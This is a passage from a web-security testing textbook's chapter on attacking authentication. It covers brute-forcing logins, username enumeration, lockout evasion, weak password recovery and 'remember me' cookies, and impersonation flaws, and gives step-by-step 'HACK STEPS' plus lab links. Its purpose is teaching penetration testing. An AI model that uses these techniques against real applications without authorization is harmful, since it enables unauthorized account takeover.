message.\nIn some applications, client-side controls are employed in an attempt to\nprevent password-guessing attacks. For example, an application may set a\ncookie such as failedlogins=1 and increment it following each unsuccess-\nful attempt. When a certain threshold is reached, the server detects this in\nthe submitted cookie and refuses to process the login attempt. This kind\nof client-side defense may prevent a manual attack from being launched\nusing only a browser, but it can, of course, be bypassed easily, as described in\nChapter 5.\ncc0066..iinndddd 116633 88//1199//22001111 1122::0066::3377 PPMM\nStuttard c06.indd V3 - 07/22/2011 Page 164\n164 Chapter 6 n Attacking Authentication\nFigure 6-2: A successful password-guessing attack\nA variation on the preceding vulnerability occurs when the failed login counter\nis held within the current session. Although there may be no indication of this on\nthe client side, all the attacker needs to do is obtain a fresh session (for example, by\nwithholding his session cookie), and he can continue his password-guessing attack.\nFinally, in some cases, the application locks out a targeted account after\na suitable number of failed logins. However, it responds to additional login\nattempts with messages that indicate (or allow an attacker to infer) whether\nthe supplied password was correct. This means that an attacker can complete\nhis password-guessing attack even though the targeted account is locked out.\nIf the application automatically unlocks accounts after a certain delay, the\nattacker simply needs to wait for this to occur and then log in as usual with\nthe discovered password.\n\nHACK STEPS\n1. Manually submit several bad login attempts for an account you control,\nmonitoring the error messages you receive.\n2. After about 10 failed logins, if the application has not returned a message\nabout account lockout, attempt to log in correctly. If this succeeds, there\nis probably no account lockout policy.\ncc0066..iinndddd 116644 88//1199//22001111 1122::0066::3377 PPMM\nStuttard c06.indd V3 - 07/22/2011 Page 165\nChapter 6 n Attacking Authentication 165\n3. If the account is locked out, try repeating the exercise using a different\naccount. This time, if the application issues any cookies, use each cookie\nfor only a single login attempt, and obtain a new cookie for each subse-\nquent login attempt.\n4. Also, if the account is locked out, see whether submitting the valid pass-\nword causes any difference in the application’s behavior compared to an\ninvalid password. If so, you can continue a password-guessing attack even\nif the account is locked out.\n5. If you do not control any accounts, attempt to enumerate a valid user-\nname (see the next section) and make several bad logins using this.\nMonitor for any error messages about account lockout.\n6. To mount a brute-force attack, first identify a difference in the applica-\ntion’s behavior in response to successful and failed logins. You can use\nthis fact to discriminate between success and failure during the course of\nthe automated attack.\n7. Obtain a list of enumerated or common usernames and a list of common\npasswords. Use any information obtained about password quality rules to\ntailor the password list so as to avoid superfluous test cases.\n8. Use a suitable tool or a custom script to quickly generate login requests\nusing all permutations of these usernames and passwords. Monitor\nthe server’s responses to identify successful login attempts. Chapter 14\ndescribes in detail various techniques and tools for performing custom-\nized attacks using automation.\n9. If you are targeting several usernames at once, it is usually preferable\nto perform this kind of brute-force attack in a breadth-first rather than\ndepth-first manner. This involves iterating through a list of passwords\n(starting with the most common) and attempting each password in turn\non every username. This approach has two benefits. First, you discover\naccounts with common passwords more quickly. Second, you are less\nlikely to trigger any account lockout defenses, because there is a time\ndelay between successive attempts using each individual account.\nTRY IT!\nhttp://mdsec.net/auth/16/\nhttp://mdsec.net/auth/32/\nhttp://mdsec.net/auth/46/\nhttp://mdsec.net/auth/49/\ncc0066..iinndddd 116655 88//1199//22001111 1122::0066::3377 PPMM\n\nStuttard c06.indd V3 - 07/22/2011 Page 166\n166 Chapter 6 n Attacking Authentication\nVerbose Failure Messages\nA typical login form requires the user to enter two pieces of information — a\nusername and password. Some applications require several more, such as date\nof birth, a memorable place, or a PIN.\nWhen a login attempt fails, you can of course infer that at least one piece of\ninformation was incorrect. However, if the application tells you which piece of\ninformation was invalid, you can exploit this behavior to considerably diminish\nthe effectiveness of the login mechanism.\nIn the simplest case, where a login requires a username and password, an\napplication might respond to a failed login attempt by indicating whether the\nreason for the failure was an unrecognized username or the wrong password,\nas illustrated in Figure 6-3.\nFigure 6-3: Verbose login failure messages indicating when a valid\nusername has been guessed\nIn this instance, you can use an automated attack to iterate through a large\nlist of common usernames to enumerate which ones are valid. Of course, user-\nnames normally are not considered a secret (they are not masked during login,\nfor instance). However, providing an easy means for an attacker to identify valid\nusernames increases the likelihood that he will compromise the application\ngiven enough time, skill, and effort. A list of enumerated usernames can be\nused as the basis for various subsequent attacks, including password guessing,\nattacks on user data or sessions, or social engineering.\nIn addition to the primary login function, username enumeration can arise\nin other components of the authentication mechanism. In principle, any func-\ntion where an actual or potential username is submitted can be leveraged for\nthis purpose. One location where username enumeration is commonly found\nis the user registration function. If the application allows new users to register\nand specify their own usernames, username enumeration is virtually impos-\nsible to prevent if the application is to prevent duplicate usernames from being\nregistered. Other locations where username enumeration are sometimes found\ncc0066..iinndddd 116666 88//1199//22001111 1122::0066::3377 PPMM\nStuttard c06.indd V3 - 07/22/2011 Page 167\nChapter 6 n Attacking Authentication 167\nare the password change and forgotten password functions, as described later\nin this chapter.\nNOTE Many authentication mechanisms disclose usernames either implic-\nitly or explicitly. In a web mail account, the username is often the e-mail\naddress, which is common knowledge by design. Many other sites expose\nusernames within the application without considering the advantage this\ngrants to an attacker, or generate usernames in a way that can be predicted\n(for example, user1842, user1843, and so on).\nIn more complex login mechanisms, where an application requires the user to\nsubmit several pieces of information, or proceed through several stages, verbose\nfailure messages or other discriminators can enable an attacker to target each\nstage of the login process in turn, increasing the likelihood that he will gain\nunauthorized access.\nNOTE This vulnerability may arise in more subtle ways than illustrated here.\nEven if the error messages returned in response to a valid and invalid username\nare superfi cially similar, there may be small differences between them that can\nbe used to enumerate valid usernames. For example, if multiple code paths\nwithin the application return the “same” failure message, there may be minor\ntypographical differences between each instance of the message. In some cases,\nthe application’s responses may be identical on-screen but contain subtle differ-\nences hidden within the HTML source, such as comments or layout differences. If\nno obvious means of enumerating usernames presents itself, you should perform\na close comparison of the application’s responses to valid and invalid usernames.\nYou can use the Comparer tool within Burp Suite to automatically analyze\nand highlight the differences between two application responses, as shown\nin Figure 6-4. This helps you quickly identify whether the username’s validity\nresults in any systematic difference in the application’s responses.\nFigure 6-4: Identifying subtle differences in application responses using Burp Comparer\ncc0066..iinndddd 116677 88//1199//22001111 1122::0066::3388 PPMM\nStuttard c06.indd V3 - 07/22/2011 Page 168\n168 Chapter 6 n Attacking Authentication\n\nHACK STEPS\n1. If you already know one valid username (for example, an account you\ncontrol), submit one login using this username and an incorrect password,\nand another login using a random username.\n2. Record every detail of the server’s responses to each login attempt,\nincluding the status code, any redirects, information displayed on-\nscreen, and any differences hidden in the HTML page source. Use your\nintercepting proxy to maintain a full history of all traffic to and from the\nserver.\n3. Attempt to discover any obvious or subtle differences in the server’s\nresponses to the two login attempts.\n4. If this fails, repeat the exercise everywhere within the application where\na username can be submitted (for example, self-registration, password\nchange, and forgotten password).\n5. If a difference is detected in the server’s responses to valid and invalid\nusernames, obtain a list of common usernames. Use a custom script or\nautomated tool to quickly submit each username, and filter the responses\nthat signify that the username is valid (see Chapter 14).\n6. Before commencing your enumeration exercise, verify whether the appli-\ncation performs any account lockout after a certain number of failed login\nattempts (see the preceding section). If so, it is desirable to design your\nenumeration attack with this fact in mind. For example, if the application\nwill grant you only three failed login attempts with any given account, you\nrun the risk of “wasting” one of these for every username you discover\nthrough automated enumeration. Therefore, when performing your enu-\nmeration attack, do not submit a far-fetched password with each login\nattempt. Instead, submit either a single common password such as pass-\nword1 or the username itself as the password. If password quality rules\nare weak, it is highly likely that some of the attempted logins you perform\nas part of your enumeration exercise will succeed and will disclose both\nthe username and password in a single hit. To set the password field to\nbe the same as the username, you can use the “battering ram” attack\nmode in Burp Intruder to insert the same payload at multiple positions in\nyour login request.\nEven if an application’s responses to login attempts containing valid and\ninvalid usernames are identical in every intrinsic respect, it may still be possible\nto enumerate usernames based on the time taken for the application to respond\nto the login request. Applications often perform very different back-end pro-\ncessing on a login request, depending on whether it contains a valid username.\nFor example, when a valid username is submitted, the application may retrieve\nuser details from a back-end database, perform various processing on these\ncc0066..iinndddd 116688 88//1199//22001111 1122::0066::3388 PPMM\n\nStuttard c06.indd V3 - 07/22/2011 Page 169\nChapter 6 n Attacking Authentication 169\ndetails (for example, checking whether the account is expired), and then validate\nthe password (which may involve a resource-intensive hash algorithm) before\nreturning a generic message if the password is incorrect. The timing difference\nbetween the two responses may be too subtle to detect when working with only\na browser, but an automated tool may be able to discriminate between them.\nEven if the results of such an exercise contain a large ratio of false positives, it\nis still better to have a list of 100 usernames, approximately 50% of which are\nvalid, than a list of 10,000 usernames, approximately 0.5% of which are valid.\nSee Chapter 15 for a detailed explanation of how to detect and exploit this type\nof timing difference to extract information from the application.\nTIP In addition to the login functionality itself, there may be other sources of\ninformation where you can obtain valid usernames. Review all the source code\ncomments discovered during application mapping (see Chapter 4) to identify\nany apparent usernames. Any e-mail addresses of developers or other personnel\nwithin the organization may be valid usernames, either in full or just the user-\nspecifi c prefi x. Any accessible logging functionality may disclose usernames.\nTRY IT!\nhttp://mdsec.net/auth/53/\nhttp://mdsec.net/auth/59/\nhttp://mdsec.net/auth/70/\nhttp://mdsec.net/auth/81/\nhttp://mdsec.net/auth/167/\nVulnerable Transmission of Credentials\nIf an application uses an unencrypted HTTP connection to transmit login cre-\ndentials, an eavesdropper who is suitably positioned on the network can, of\ncourse, intercept them. Depending on the user’s location, potential eavesdrop-\npers may reside:\nn On the user’s local network\nn Within the user’s IT department\nn Within the user’s ISP\nn On the Internet backbone\nn Within the ISP hosting the application\nn Within the IT department managing the application\ncc0066..iinndddd 116699 88//1199//22001111 1122::0066::3388 PPMM\nStuttard c06.indd V3 - 07/22/2011 Page 170\n170 Chapter 6 n Attacking Authentication\nNOTE Any of these locations may be occupied by authorized personnel but\nalso potentially by an external attacker who has compromised the relevant\ninfrastructure through some other means. Even if the intermediaries on a par-\nticular network are believed to be trusted, it is safer to use secure transport\nmechanisms when passing sensitive data over it.\nEven if login occurs over HTTPS, credentials may still be disclosed to unau-\nthorized parties if the application handles them in an unsafe manner:\nn If credentials are transmitted as query string parameters, as opposed\nto in the body of a POST request, these are liable to be logged in various\nplaces, such as within the user’s browser history, within the web server\nlogs, and within the logs of any reverse proxies employed within the\nhosting infrastructure. If an attacker succeeds in compromising any of\nthese resources, he may be able to escalate privileges by capturing the\nuser credentials stored there.\nn Although most web applications do use the body of a POST request to\nsubmit the HTML login form itself, it is surprisingly common to see the\nlogin request being handled via a redirect to a different URL with the same\ncredentials passed as query string parameters. Why application develop-\ners consider it necessary to perform these bounces is unclear, but having\nelected to do so, it is easier to implement them as 302 redirects to a URL\nthan as POST requests using a second HTML form submitted via JavaScript.\nn Web applications sometimes store user credentials in cookies, usually\nto implement poorly designed mechanisms for login, password change,\n“remember me,” and so on. These credentials are vulnerable to capture\nvia attacks that compromise user cookies and, in the case of persistent\ncookies, by anyone who gains access to the client’s local fi lesystem. Even if\nthe credentials are encrypted, an attacker still can simply replay the cookie\nand therefore log in as a user without actually knowing her credentials.\nChapters 12 and 13 describe various ways in which an attacker can target\nother users to capture their cookies.\nMany applications use HTTP for unauthenticated areas of the application and\nswitch to HTTPS at the point of login. If this is the case, then the correct place\nto switch to HTTPS is when the login page is loaded in the browser, enabling a\nuser to verify that the page is authentic before entering credentials. However, it\nis common to encounter applications that load the login page itself using HTTP\nand then switch to HTTPS at the point where credentials are submitted. This\nis unsafe, because a user cannot verify the authenticity of the login page itself\nand therefore has no assurance that the credentials will be submitted securely.\nA suitably positioned attacker can intercept and modify the login page, chang-\ning the target URL of the login form to use HTTP. By the time an astute user\nrealizes that the credentials have been submitted using HTTP, they will have\nbeen compromised.\ncc0066..iinndddd 117700 88//1199//22001111 1122::0066::3388 PPMM\n\nStuttard c06.indd V3 - 07/22/2011 Page 171\nChapter 6 n Attacking Authentication 171\n\nHACK STEPS\n1. Carry out a successful login while monitoring all traffic in both directions\nbetween the client and server.\n2. Identify every case in which the credentials are transmitted in either\ndirection. You can set interception rules in your intercepting proxy to flag\nmessages containing specific strings (see Chapter 20).\n3. If any instances are found in which credentials are submitted in a URL\nquery string or as a cookie, or are transmitted back from the server to the\nclient, understand what is happening, and try to ascertain what purpose\nthe application developers were attempting to achieve. Try to find every\nmeans by which an attacker might interfere with the application’s logic to\ncompromise other users’ credentials.\n4. If any sensitive information is transmitted over an unencrypted channel,\nthis is, of course, vulnerable to interception.\n5. If no cases of actual credentials being transmitted insecurely are iden-\ntified, pay close attention to any data that appears to be encoded or\nobfuscated. If this includes sensitive data, it may be possible to reverse-\nengineer the obfuscation algorithm.\n6. If credentials are submitted using HTTPS but the login form is loaded\nusing HTTP, the application is vulnerable to a man-in-the-middle attack,\nwhich may be used to capture credentials.\nTRY IT!\nhttp://mdsec.net/auth/88/\nhttp://mdsec.net/auth/90/\nhttp://mdsec.net/auth/97/\nPassword Change Functionality\nSurprisingly, many web applications do not provide any way for users to change\ntheir password. However, this functionality is necessary for a well-designed\nauthentication mechanism for two reasons:\nn Periodic enforced password change mitigates the threat of password com-\npromise. It reduces the window in which a given password can be targeted\nin a guessing attack. It also reduces the window in which a compromised\npassword can be used without detection by the attacker.\nn Users who suspect that their passwords may have been compromised\nneed to be able to quickly change their password to reduce the threat of\nunauthorized use.\ncc0066..iinndddd 117711 88//1199//22001111 1122::0066::3388 PPMM\nStuttard c06.indd V3 - 07/22/2011 Page 172\n172 Chapter 6 n Attacking Authentication\nAlthough it is a necessary part of an effective authentication mechanism,\npassword change functionality is often vulnerable by design. Vulnerabilities\nthat are deliberately avoided in the main login function often reappear in the\npassword change function. Many web applications’ password change functions\nare accessible without authentication and do the following:\nn Provide a verbose error message indicating whether the requested user-\nname is valid.\nn Allow unrestricted guesses of the “existing password” fi eld.\nn Check whether the “new password” and “confi rm new password” fi elds\nhave the same value only after validating the existing password, thereby\nallowing an attack to succeed in discovering the existing password\nnoninvasively.\nA typical password change function includes a relatively large logical decision\ntree. The application needs to identify the user, validate the supplied existing\npassword, integrate with any account lockout defenses, compare the supplied\nnew passwords with each other and against password quality rules, and feed\nback any error conditions to the user in a suitable way. Because of this, pass-\nword change functions often contain subtle logic fl aws that can be exploited to\nsubvert the entire mechanism.\n\nHACK STEPS\n1. Identify any password change functionality within the application. If\nthis is not explicitly linked from published content, it may still be imple-\nmented. Chapter 4 describes various techniques for discovering hidden\ncontent within an application.\n2. Make various requests to the password change function using invalid\nusernames, invalid existing passwords, and mismatched “new password”\nand “confirm new password” values.\n3. Try to identify any behavior that can be used for username enumeration\nor brute-force attacks (as described in the “Brute-Forcible Login” and\n“Verbose Failure Messages” sections).\nTIP If the password change form is accessible only by authenticated users\nand does not contain a username fi eld, it may still be possible to supply an\narbitrary username. The form may store the username in a hidden fi eld, which\ncan easily be modifi ed. If not, try supplying an additional parameter contain-\ning the username, using the same parameter name as is used in the main\nlogin form. This trick sometimes succeeds in overriding the username of the\ncurrent user, enabling you to brute-force the credentials of other users even\nwhen this is not possible at the main login.\ncc0066..iinndddd 117722 88//1199//22001111 1122::0066::3388 PPMM\n\nStuttard c06.indd V3 - 07/22/2011 Page 173\nChapter 6 n Attacking Authentication 173\nTRY IT!\nhttp://mdsec.net/auth/104/\nhttp://mdsec.net/auth/117/\nhttp://mdsec.net/auth/120/\nhttp://mdsec.net/auth/125/\nhttp://mdsec.net/auth/129/\nhttp://mdsec.net/auth/135/\nForgotten Password Functionality\nLike password change functionality, mechanisms for recovering from a forgot-\nten password situation often introduce problems that may have been avoided\nin the main login function, such as username enumeration.\nIn addition to this range of defects, design weaknesses in forgotten pass-\nword functions frequently make this the weakest link at which to attack the\napplication’s overall authentication logic. Several kinds of design weaknesses\ncan often be found:\nn Forgotten password functionality often involves presenting the user with\na secondary challenge in place of the main login, as shown in Figure 6-5.\nThis challenge is often much easier for an attacker to respond to than\nattempting to guess the user’s password. Questions about mothers’ maiden\nnames, memorable dates, favorite colors, and the like generally will have a\nmuch smaller set of potential answers than the set of possible passwords.\nFurthermore, they often concern information that is publicly known or\nthat a determined attacker can discover with a modest degree of effort.\nFigure 6-5: A secondary challenge used in an account\nrecovery function\nIn many cases, the application allows users to set their own password\nrecovery challenge and response during registration. Users are inclined\ncc0066..iinndddd 117733 88//1199//22001111 1122::0066::3388 PPMM\nStuttard c06.indd V3 - 07/22/2011 Page 174\n174 Chapter 6 n Attacking Authentication\nto set extremely insecure challenges, presumably on the false assumption\nthat only they will ever be presented with them. An example is “Do I own\na boat?” In this situation, an attacker who wants to gain access can use\nan automated attack to iterate through a list of enumerated or common\nusernames, log all the password recovery challenges, and select those that\nappear most easily guessable. (See Chapter 14 for techniques regarding\nhow to grab this kind of data in a scripted attack.)\nn As with password change functionality, application developers commonly\noverlook the possibility of brute-forcing the response to a password recov-\nery challenge, even when they block this attack on the main login page. If\nan application allows unrestricted attempts to answer password recovery\nchallenges, it is highly likely to be compromised by a determined attacker.\nn In some applications, the recovery challenge is replaced with a simple\npassword “hint” that is confi gured by users during registration. Users\ncommonly set extremely obvious hints, perhaps even one that is identi-\ncal to the password itself, on the false assumption that only they will\never see them. Again, an attacker with a list of common or enumerated\nusernames can easily capture a large number of password hints and then\nstart guessing.\nn The mechanism by which an application enables users to regain control of\ntheir account after correctly responding to a challenge is often vulnerable.\nOne reasonably secure means of implementing this is to send a unique,\nunguessable, time-limited recovery URL to the e-mail address that the\nuser provided during registration. Visiting this URL within a few minutes\nenables the user to set a new password. However, other mechanisms for\naccount recovery are often encountered that are insecure by design:\nn Some applications disclose the existing, forgotten password to the user\nafter successful completion of a challenge, enabling an attacker to use\nthe account indefi nitely without any risk of detection by the owner.\nEven if the account owner subsequently changes the blown password,\nthe attacker can simply repeat the same challenge to obtain the new\npassword.\nn Some applications immediately drop the user into an authenticated\nsession after successful completion of a challenge, again enabling an\nattacker to use the account indefi nitely without detection, and without\never needing to know the user’s password.\nn Some applications employ the mechanism of sending a unique recov-\nery URL but send this to an e-mail address specifi ed by the user at the\ntime the challenge is completed. This provides absolutely no enhanced\nsecurity for the recovery process beyond possibly logging the e-mail\naddress used by an attacker.\ncc0066..iinndddd 117744 88//1199//22001111 1122::0066::3388 PPMM\nStuttard c06.indd V3 - 07/22/2011 Page 175\nChapter 6 n Attacking Authentication 175\nTIP Even if the application does not provide an on-screen fi eld for you to pro-\nvide an e-mail address to receive the recovery URL, the application may transmit\nthe address via a hidden form fi eld or cookie. This presents a double opportunity:\nyou can discover the e-mail address of the user you have compromised, and you\ncan modify its value to receive the recovery URL at an address of your choosing.\nn Some applications allow users to reset their password’s value directly\nafter successful completion of a challenge and do not send any e-mail\nnotifi cation to the user. This means that the compromising of an account\nby an attacker will not be noticed until the owner attempts to log in\nagain. It may even remain unnoticed if the owner assumes that she\nmust have forgotten her password and therefore resets it in the same\nway. An attacker who simply desires some access to the application can\nthen compromise a different user’s account for a period of time and\ntherefore can continue using the application indefi nitely.\n\nHACK STEPS\n1. Identify any forgotten password functionality within the application. If\nthis is not explicitly linked from published content, it may still be imple-\nmented (see Chapter 4).\n2. Understand how the forgotten password function works by doing a\ncomplete walk-through using an account you control.\n3. If the mechanism uses a challenge, determine whether users can set or\nselect their own challenge and response. If so, use a list of enumerated or\ncommon usernames to harvest a list of challenges, and review this for any\nthat appear easily guessable.\n4. If the mechanism uses a password “hint,” do the same exercise to harvest\na list of password hints, and target any that are easily guessable.\n5. Try to identify any behavior in the forgotten password mechanism that\ncan be exploited as the basis for username enumeration or brute-force\nattacks (see the previous details).\n6. If the application generates an e-mail containing a recovery URL in\nresponse to a forgotten password request, obtain a number of these URLs,\nand attempt to identify any patterns that may enable you to predict the\nURLs issued to other users. Employ the same techniques as are relevant to\nanalyzing session tokens for predictability (see Chapter 7).\nTRY IT!\nhttp://mdsec.net/auth/142/\nhttp://mdsec.net/auth/145/\nhttp://mdsec.net/auth/151/\ncc0066..iinndddd 117755 88//1199//22001111 1122::0066::3388 PPMM\n\nStuttard c06.indd V3 - 07/22/2011 Page 176\n176 Chapter 6 n Attacking Authentication\n“Remember Me” Functionality\nApplications often implement “remember me” functions as a convenience to\nusers. This way, users don’t need to reenter their username and password each\ntime they use the application from a specifi c computer. These functions are\noften insecure by design and leave the user exposed to attack both locally and\nby users on other computers:\nn Some “remember me” functions are implemented using a simple per-\nsistent cookie, such as RememberUser=daf (see Figure 6-6). When this\ncookie is submitted to the initial application page, the application trusts\nthe cookie to authenticate the user, and it creates an application session\nfor that person, bypassing the login. An attacker can use a list of common\nor enumerated usernames to gain full access to the application without\nany authentication.\nFigure 6-6: A vulnerable “remember me” function, which automatically logs in a\nuser based solely on a username stored in a cookie\ncc0066..iinndddd 117766 88//1199//22001111 1122::0066::3399 PPMM\nStuttard c06.indd V3 - 07/22/2011 Page 177\nChapter 6 n Attacking Authentication 177\nn Some “remember me” functions set a cookie that contains not the username\nbut a kind of persistent session identifi er, such as RememberUser=1328.\nWhen the identifi er is submitted to the login page, the application looks\nup the user associated with it and creates an application session for\nthat user. As with ordinary session tokens, if the session identifi ers of\nother users can be predicted or extrapolated, an attacker can iterate\nthrough a large number of potential identifi ers to fi nd those associ-\nated with application users, and therefore gain access to their accounts\nwithout authentication. See Chapter 7 for techniques for performing\nthis attack.\nn Even if the information stored for reidentifying users is suitably protected\n(encrypted) to prevent other users from determining or guessing it, the\ninformation may still be vulnerable to capture through a bug such as\ncross-site scripting (see Chapter 12), or by an attacker who has local access\nto the user’s computer.\n\nHACK STEPS\n1. Activate any “remember me” functionality, and determine whether the\nfunctionality indeed does fully “remember” the user or whether it remem-\nbers only his username and still requires him to enter a password on sub-\nsequent visits. If the latter is the case, the functionality is much less likely\nto expose any security flaw.\n2. Closely inspect all persistent cookies that are set, and also any data that\nis persisted in other local storage mechanisms, such as Internet Explorer’s\nuserData, Silverlight isolated storage, or Flash local shared objects. Look\nfor any saved data that identifies the user explicitly or appears to contain\nsome predictable identifier of the user.\n3. Even where stored data appears to be heavily encoded or obfuscated,\nreview this closely. Compare the results of “remembering” several very\nsimilar usernames and/or passwords to identify any opportunities to\nreverse-engineer the original data. Here, use the same techniques that\nare described in Chapter 7 to detect meaning and patterns in session\ntokens.\n4. Attempt to modify the contents of the persistent cookie to try to con-\nvince the application that another user has saved his details on your\ncomputer.\ncc0066..iinndddd 117777 88//1199//22001111 1122::0066::3399 PPMM\n\nStuttard c06.indd V3 - 07/22/2011 Page 178\n178 Chapter 6 n Attacking Authentication\nTRY IT!\nhttp://mdsec.net/auth/219/\nhttp://mdsec.net/auth/224/\nhttp://mdsec.net/auth/227/\nhttp://mdsec.net/auth/229/\nhttp://mdsec.net/auth/232/\nhttp://mdsec.net/auth/236/\nhttp://mdsec.net/auth/239/\nhttp://mdsec.net/auth/245/\nUser Impersonation Functionality\nSome applications implement the facility for a privileged user of the application\nto impersonate other users in order to access data and carry out actions within\ntheir user context. For example, some banking applications allow helpdesk opera-\ntors to verbally authenticate a telephone user and then switch their application\nsession into that user’s context to assist him or her.\nVarious design fl aws commonly exist within impersonation functionality:\nn It may be implemented as a “hidden” function, which is not subject to\nproper access controls. For example, anyone who knows or guesses the\nURL/admin/ImpersonateUser.jsp may be able to make use of the func-\ntion and impersonate any other user (see Chapter 8).\nn The application may trust user-controllable data when determining whether\nthe user is performing impersonation. For example, in addition to a valid\nsession token, a user may submit a cookie specifying which account his\nsession is currently using. An attacker may be able to modify this value\nand gain access to other user accounts without authentication, as shown\nin Figure 6-7.\nn If an application allows administrative users to be impersonated, any weak-\nness in the impersonation logic may result in a vertical privilege escalation\nvulnerability. Rather than simply gaining access to other ordinary users’\ndata, an attacker may gain full control of the application.\nn Some impersonation functionality is implemented as a simple “backdoor”\npassword that can be submitted to the standard login page along with any\nusername to authenticate as that user. This design is highly insecure for\nmany reasons, but the biggest opportunity for attackers is that they are\nlikely to discover this password when performing standard attacks such\nas brute-forcing of the login. If the backdoor password is matched before\nthe user’s actual password, the attacker is likely to discover the function of\ncc0066..iinndddd 117788 88//1199//22001111 1122::0066::3399 PPMM\nStuttard c06.indd V3 - 07/22/2011 Page 179\nChapter 6 n Attacking Authentication 179\nthe backdoor password and therefore gain access to every user’s account.\nSimilarly, a brute-force attack might result in two different “hits,” thereby\nrevealing the backdoor password, as shown in Figure 6-8.\nFigure 6-7: A vulnerable user impersonation function\n\nHACK STEPS\n1. Identify any impersonation functionality within the application. If this is\nnot explicitly linked from published content, it may still be implemented\n(see Chapter 4).\n2. Attempt to use the impersonation functionality directly to impersonate\nother users.\n3. Attempt to manipulate any user-supplied data that is processed by the\nimpersonation function in an attempt to impersonate other users. Pay\nparticular attention to any cases where your username is being submitted\nother than during normal login.\n4. If you succeed in making use of the functionality, attempt to impersonate\nany known or guessed administrative users to elevate privileges.\n5. When carrying out password-guessing attacks (see the “Brute-Forcible\nLogin” section), review whether any users appear to have more than one\nvalid password, or whether a specific password has been matched against\nseveral usernames. Also, log in as many different users with the credentials\ncaptured in a brute-force attack, and review whether everything appears\nnormal. Pay close attention to any “logged in as X” status message.\ncc0066..iinndddd 117799 88//1199//22001111 1122::0066::3399 PPMM\n\nStuttard c06.indd V3 - 07/22/2011 Page 180\n180 Chapter 6 n Attacking Authentication\nTRY IT!\nhttp://mdsec.net/auth/272/\nhttp://mdsec.net/auth/290/\nFigure 6-8: A password-guessing attack with two “hits,” indicating the\npresence of a backdoor password\nIncomplete Validation of Credentials\nWell-designed authentication mechanisms enforce various requirements on\npasswords, such as a minimum length or the presence of both uppercase and\nlowercase characters. Correspondingly, some poorly designed authentication\nmechanisms not only do not enforce these good practices but also do not take\ninto account users’ own attempts to comply with them.\nFor example, some applications truncate passwords and therefore validate\nonly the fi rst n characters. Some applications perform a case-insensitive check\nof passwords. Some applications strip unusual characters (sometimes on the\npretext of performing input validation) before checking passwords. In recent\ntimes, behavior of this kind has been identifi ed in some surprisingly high-profi le\nweb applications, usually as a result of trial and error by curious users.\ncc0066..iinndddd 118800 88//1199//22001111 1122::0066::3399 PPMM\n\nStuttard c06.indd V3 - 07/22/2011 Page 181\nChapter 6 n Attacking Authentication 181\nEach of these limitations on password validation reduces by an order of\nmagnitude the number of variations available in the set of possible passwords.\nThrough experimentation, you can determine whether a password is being\nfully validated or whether any limitations are in effect. You can then fi ne-tune\nyour automated attacks against the login to remove unnecessary test cases,\nthereby massively reducing the number of requests necessary to compromise\nuser accounts.\n\nHACK STEPS\n1. Using an account you control, attempt to log in with variations on your\nown password: removing the last character, changing the case of a char-\nacter, and removing any special typographical characters. If any of these\nattempts is successful, continue experimenting to try to understand what\nvalidation is actually occurring.\n2. Feed any results back into your automated password-guessing attacks to\nremove superfluous test cases and improve the chances of success.\nTRY IT!\nhttp://mdsec.net/auth/293/\nNonunique Usernames\nSome applications that support self-registration allow users to specify their\nown username and do not enforce a requirement that usernames be unique.\nAlthough this is rare, the authors have encountered more than one application\nwith this behavior.\nThis represents a design fl aw for two reasons:\nn One user who shares a username with another user may also happen to\nselect the same password as that user, either during registration or in a\nsubsequent password change. In this eventuality, the application either\nrejects the second user’s chosen password or allows two accounts to\nhave identical credentials. In the fi rst instance, the application’s behavior\neffectively discloses to one user the credentials of the other user. In the\nsecond instance, subsequent logins by one of the users result in access to\nthe other user’s account.\nn An attacker may exploit this behavior to carry out a successful brute-force\nattack, even though this may not be possible elsewhere due to restrictions\non failed login attempts. An attacker can register a specifi c username\ncc0066..iinndddd 118811 88//1199//22001111 1122::0066::3399 PPMM\n\nStuttard c06.indd V3 - 07/22/2011 Page 182\n182 Chapter 6 n Attacking Authentication\nmultiple times with different passwords while monitoring for the dif-\nferential response that indicates that an account with that username\nand password already exists. The attacker will have ascertained a target\nuser’s password without making a single attempt to log in as that user.\nBadly designed self-registration functionality can also provide a means for\nusername enumeration. If an application disallows duplicate usernames, an\nattacker may attempt to register large numbers of common usernames to iden-\ntify the existing usernames that are rejected.\n\nHACK STEPS\n1. If self-registration is possible, attempt to register the same username\ntwice with different passwords.\n2. If the application blocks the second registration attempt, you can exploit\nthis behavior to enumerate existing usernames even if this is not possible\non the main login page or elsewhere. Make multiple registration attempts\nwith a list of common usernames to identify the already registered names\nthat the application blocks.\n3. If the registration of duplicate usernames succeeds, attempt to register\nthe same username twice with the same password, and determine the\napplication’s behavior:\na. If an error message results, you can exploit this behavior to carry out a\nbrute-force attack, even if this is not possible on the main login page.\nTarget an enumerated or guessed username, and attempt to register\nthis username multiple times with a list of common passwords. When\nthe application rejects a specific password, you have probably found\nthe existing password for the targeted account.\nb. If no error message results, log in using the credentials you speci-\nfied, and see what happens. You may need to register several users,\nand modify different data held within each account, to understand\nwhether this behavior can be used to gain unauthorized access to\nother users’ accounts.\nPredictable Usernames\nSome applications automatically generate account usernames according to\na predictable sequence (cust5331, cust5332, and so on). When an application\nbehaves like this, an attacker who can discern the sequence can quickly arrive\nat a potentially exhaustive list of all valid usernames, which can be used as\nthe basis for further attacks. Unlike enumeration methods that rely on making\nrepeated requests driven by wordlists, this means of determining usernames\ncan be carried out nonintrusively with minimal interaction with the application.\ncc0066..iinndddd 118822 88//1199//22001111 1122::0066::4400 PPMM\n\nStuttard c06.indd V3 - 07/22/2011 Page 183\nChapter 6 n Attacking Authentication 183\n\nHACK STEPS\n1. If the application generates usernames, try to obtain several in quick\nsuccession, and determine whether any sequence or pattern can be\ndiscerned.\n2. If it can, extrapolate backwards to obtain a list of possible valid user-\nnames. This can be used as the basis for a brute-force attack against the\nlogin and other attacks where valid usernames are required, such as the\nexploitation of access control flaws (see Chapter 8).\nTRY IT!\nhttp://mdsec.net/auth/169/\nPredictable Initial Passwords\nIn some applications, users are created all at once or in sizeable batches and are\nautomatically assigned initial passwords, which are then distributed to them\nthrough some means. The means of generating passwords may enable an attacker\nto predict the passwords of other application users. This kind of vulnerability is\nmore common on intranet-based corporate applications — for example, where\nevery employee has an account created on her behalf and receives a printed\nnotifi cation of her password.\nIn the most vulnerable cases, all users receive the same password, or one\nclosely derived from their username or job function. In other cases, generated\npasswords may contain sequences that could be identifi ed or guessed with\naccess to a very small sample of initial passwords.\n\nHACK STEPS\n1. If the application generates passwords, try to obtain several in quick\nsuccession, and determine whether any sequence or pattern can be\ndiscerned.\n2. If it can, extrapolate the pattern to obtain a list of 